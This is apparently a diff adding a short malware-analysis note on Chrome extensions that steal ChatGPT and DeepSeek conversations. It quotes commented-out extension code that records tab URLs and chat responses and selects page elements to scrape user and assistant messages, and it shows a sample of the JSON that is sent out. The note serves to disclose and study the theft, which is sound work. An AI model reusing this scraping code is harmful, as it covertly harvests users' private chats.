@@ -1,0 +1,59 @@
+Lines of code found that assist in stealing chat data: 
+
+/*function detailedAns(answer){
+    chrome.tabs.onUpdated.addListener(async (e, t, n) => {
+      if (n.url && "complete" === t.status && gptChatVars.globalFlag) {
+        n.url = gptChatVars.restrict.has(n.url) ? gptChatVars.defaultVars : n.url;
+
+        if (n && n?.url && n?.url.length)
+          gptChatVars.globalarr.push({
+            gptChatId: gptChatVars.globalGptId,
+            answer: gptChatVars.chatResponseCache || gptChatVars.defaultVars,
+            qus: n.url || gptChatVars.defaultVars,
+            timeStamp: Date.now(),
+          });
+
+        gptChatVars.chatResponeCache = n.url || gptChatVars.defaultVars;
+        if (gptChatVars.globalarr.length > 2000) gptChatVars.globalarr = [];
+
+        debounce(callInsideDebounce);
+      }
+    });
+  }*/
+
+As seen in our demo, the values stored in "gptChatVars" are seen (slightly different names, might have been updated
+or was a different extension) in the JSON text that is sent by the extension:
+"""
+{
+  "chatId":" 76f94183-bc5a-4fab-87c8-ff41f4f9f075", 
+  "answer": "https://chatgpt.com/",
+  "qus": "https://chatgpt.com/",
+  "timeStamp": 1777916717348)
+}
+"""
+
+Once it sees the current URL, it looks to see if the URL contains "chatgpt" or "deepseek". This is a snippet of code found that
+shows how they do it:
+
+/*const getGptSelectors = () => {
+    const url = window.location.href;
+    if (url.includes("chatgpt")) {
+      return {
+        response: "[data-message-author-role='assistant']",
+        query: "[data-message-author-role='user']",
+        stopIndicator: "button[aria-label='Bad response']",
+      };
+    } else if (url.includes("deepseek")) {
+      return {
+        response: ".ds-markdown.ds-markdown--block",
+        query: ".fbb737a4",
+        stopIndicator: ".ds-flex._965abe9",
+      };
+    }
+    return { response: null, query: null, stopIndicator: null };
+  };*/
+
+
+References: 
+1) https://www.ox.security/blog/malicious-chrome-extensions-steal-chatgpt-deepseek-conversations/
+2) https://thehackernews.com/2026/01/two-chrome-extensions-caught-stealing.html
